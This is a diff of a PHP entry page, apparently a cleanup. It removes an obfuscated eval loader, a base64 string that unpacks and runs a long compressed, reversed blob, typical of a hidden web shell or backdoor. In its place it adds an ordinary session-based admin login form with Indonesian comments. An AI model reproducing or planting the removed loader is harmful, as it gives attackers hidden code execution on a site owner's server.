@@ -1,8 +1,89 @@
- 
 <?php
+session_start();
+// Cek apakah pengguna sudah login
+if (isset($_SESSION["login"]) && $_SESSION["login"] === true) {
+  // Jika sudah login, redirect ke halaman dashboard
+  header('Location: dashboard/');
+  exit;
+}
 
-$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
-$Crime = "==QjTjmBNoj2d9j4jWugefVpjf9C1N0lU31Ym/Nan84Kl2QNb9ZrpQEWATzGMJifXYkIyWXhxOwhRuqRqVImoz6oOvOttzCt0IbEm9AetC45WsYsSu9GDiLL+GXDv8lBw8LZlbpFPG1L8BtfqK23mmqk9XDLXvTfSZ8fqbo7W2j7Kzzirp+nf4dOYzIeLQyyZYbRUVoyeJDLATUH1L5lRIXdH8MhsCn2anallripcCErYUVXoDFQ4pgV1ExpiCmss9AbmrOXgad6ND52guburJ8Yqrus4Zdy0KwuYaVaQA47MEkDx7xQpxk2oYlJY4NCHh6igh1V9gsxlpX+3EymVthXtrmqxegjJaWlfldBiXXmO0dQZFu7YsVcygrhjr5gnNtZwigTkj63wC3rAmfVw4pVHsc7ttZDRW0Pg/jDviw/+69TOSx+lkCGzq95R7lzDsr7Qn8XwkRZO3RDPbYQ1foi1MyrcLwAT4oysF1FUQxAX06kJqEBUpSjFLBYR85TJmgICH4p8R8vKfKnQdTbuD4e0d2tLZCJetqnP67yZTYF084AOHoEFdkKwNQ76Cr/7WNdU7GsBTRPMFFx7w1IqMExquNkH8MozigFy0asfRkvCWcxsqjq8wr+ycXXSZdwPnB6GMYdDiWWwdeyT8jLhkiCOx4zBno8A5AjwOihWo01MzraJJTFTkUeViORKIuhMV17S2mqqFZdTcWdLFzg2CvT05SxITEsb20zWXvziqsH5L7zbt75+1iUEKIZ6BO4KEjz5huxMydbE+/abC0AGcXQtxqS5aCH9XkGESuCWIXjRg/jhgCkg4SF81IpXtOOsDt9RKB90m7eY/WY9bdgGG5MQi5b6ivU73sksrvSBunzZJCcKmqA3LF9C/w33qHZGT8jTcOOMPymKkTImFtHVqji0pIT3yV5674f3c7vN3+923Pu+/mb/db7XP/ewBKCtG27M8LfRS4ZdUlUa6zZXfwGmsKJSVUzESI23s6byx0BUNJBhJFIbqj6wFxKyfRs0IiZHFb5QFSuTxC+lIHPCjFjseId3M/pITfkjZpYNQ0xJc0obzubC6cJ8MCyS/RR7PSrSQC2C2zO/98rnc4jRXb9V68+Hs26I2yyqGPRGZqqvIKgIXZRX6DNuAaV0159bwE7F1CPXKSvjA8BDEZ68l+vfw2U7mu7kcNp0rxTCFtIJfQAaL5BzuubYri2SOPQCbTEJpI97jeD2mL8vqy5e+nx5aRrOJEZWeAKTGhYwcgux64A9PwcsY2V+l1GrpSgY+CxwPpbLT/pTcghyvFz2eLzTtOU+16jiQkoYx9D3tJ2y4+im4Ceu+yiXHGQPliYdJYXzZ/161KNE33cUiVr+UND9gc592o1A0h7yNvS36qRxYpGMzFAsUpJlP9DScJGEbhc0pY7TdKRDlW4hLaMZVu5kKsd1laFGFP0WPFFeiRUDIUEcJ0rERXpGnFutddeKEI5i0erL2occ41KLMr2d6roi0Go8QT7drhnaUpAu4mIvkxzs190K36SHSyLe4FX8qTImWOo/L3mTq2UrcYlzYNmJzDAinP1a35zi3+JDFswZ9EPQTK8NsvU5FFMX8C8DvVchwnS9ClqhdcexP50dSQhOO8k7mf0DLO/4H90lr/O5w9+60jfODFtiblv9GHshNH4HI6x+F+m3h7gwUxYdu7zhcWMVptHY9asTHiCYtEJMPElAD88ROkzC52+bxUW5/IAN0XdwvB48ipH5Bez3rQf8YwykPWczEv8/5HPohfxJffTNj2VAhpm6nuEqUJ2E21ApUBFpNeILmSsWWgPrN87W77txurplbI09qiF12cN1P7iggO5zkDnO7NHLew6fB2FrwikQm+HT+HoUp/M0fT7vYjXF1dsSBioThhlJiCCxKWgsNeS7KylyyGWlIWavcWH0CSHsiFlDzPgu1HE2MubbbV1cin+OVQsBwJe6PUB8Gg++UQwBofOFYcA";
-eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
-exit;
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+
+  // Ambil data dari form login
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  // Ambil data username dan password dari file json
+  $data = file_get_contents('dashboard/config/data.json');
+  $users = json_decode($data, true)['users'];
+
+  // Cek apakah username ditemukan
+  $userFound = false;
+  $hashedPassword = '';
+
+  foreach ($users as $user) {
+    if ($username === $user['username']) {
+      $userFound = true;
+      $hashedPassword = $user['password'];
+      break;
+    }
+  }
+
+  if ($userFound && password_verify($password, $hashedPassword)) {
+    // Login sukses, redirect ke dashboard
+    $_SESSION["login"] = true; // membuat session login
+    header('Location: dashboard/');
+    exit;
+  } else {
+    // Login gagal, tampilkan pesan error
+    $error = 'Invalid username or password';
+
+    // Redirect ke halaman login lagi
+    header("Location: ".$_SERVER['PHP_SELF']."?error=".urlencode($error));
+    exit;
+  }
+}
+// Jika belum login atau login salah, tampilkan halaman login
 ?>
+
+ 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Login Dashboard - ホストコード</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.7/tailwind.min.css">
+</head>
+<body class="bg-gradient-to-br from-gray-800 bg-gray-900" style="font-size:13px;   
+                   font-family: 'Open Sans', sans-serif;">
+  <div id="login-modal" class="absolute top-0 left-0 w-full h-full flex justify-center items-center p-5">
+    <div class="bg-gray-700 bg-opacity-50 rounded-lg p-14 border-2 border-gray-800 ">
+    	<div class="flex justify-center">
+  <a href="https://<?php echo $_SERVER['HTTP_HOST']; ?>">
+    <img src="dashboard/asset/logo.gif" class="w-30 h-30 rounded-full object-cover mb-4" alt="Logo" width="160" height="160">
+  </a>
+</div>
+      <h2 class="text-2xl font-bold mb-8 text-center text-white">- LOGIN ADMIN -</h2>
+      <?php if (isset($error)) { ?>
+        <div class="bg-red-400 border justify-content-center text-center text-white font-bold rounded-lg mb-6">
+          <?php echo $error; ?>
+        </div>
+      <?php } ?>
+      <form action="" method="post">
+        <div class="mb-2">
+          <input class="bg-gray-900 font-bold text-center border-2 border-gray-800 rounded-lg py-3 px-10 text-gray-300 leading-tight focus:outline-none focus:border-teal-500 w-full" id="username" type="text" name="username" placeholder="USERNAME ">
+        </div>
+        <div class="mb-4">
+          <input class="bg-gray-900 font-bold text-center border-2 border-gray-800 rounded-lg py-3 px-10 text-gray-300 leading-tight focus:outline-none focus:border-teal-500 w-full" id="password" type="password" name="password" placeholder="PASSWORD">
+        </div>
+        <div class="flex justify-center">
+          <button class="bg-blue-500 hover:bg-teal-700 text-white font-bold py-2 px-8 rounded-lg focus:outline-none focus:shadow-outline border border-gray-100" type="submit">
+            MASUK
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
